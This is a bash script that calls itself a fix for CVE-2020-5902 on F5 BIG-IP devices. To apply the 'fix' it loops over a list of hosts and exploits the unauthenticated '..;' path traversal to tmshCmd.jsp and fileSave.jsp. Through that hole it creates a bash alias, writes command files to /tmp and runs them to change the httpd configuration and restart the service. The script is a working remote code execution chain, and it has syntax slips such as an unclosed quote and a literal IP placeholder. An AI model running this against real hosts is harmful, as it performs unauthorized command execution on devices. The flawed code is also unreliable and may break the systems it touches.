#!/bin/bash
# This scrip will help to fix the vulnerability of CVE-2020-5902 without changing the original password

while read line; do
  echo 'fixing '$line';
  (curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
  curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/tmp1&content=curl+-u+admin:+-k+https://127.0.0.1/mgmt/tm/sys/httpd+-X+PATCH+-d+%27{%22include%22:%22\n+%3CLocationMatch+\\\%22.*\\\\.\\\\.;.*\\\%22%3E\n+Redirect+404+/\n+%3C/LocationMatch%3E\n+%22}%27+-H+content-type:application/json
  curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/tmp2&content=curl+-sku+admin:+-H+"Content-Type:+application/json"+-d+'{"command":"save"}'+https://[IP+Address]/mgmt/tm/sys/config
  curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/tmp3&content=curl+-ksu+admin:+-H+"Content-Type:+application/json"+-X+POST+https://[IP+Address]/mgmt/tm/sys/service+-d+'{"command":"restart","name":"httpd"}'
  curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/tmp1
  curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/tmp2
  curl -sk https://${line}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/tmp3)
done < $1
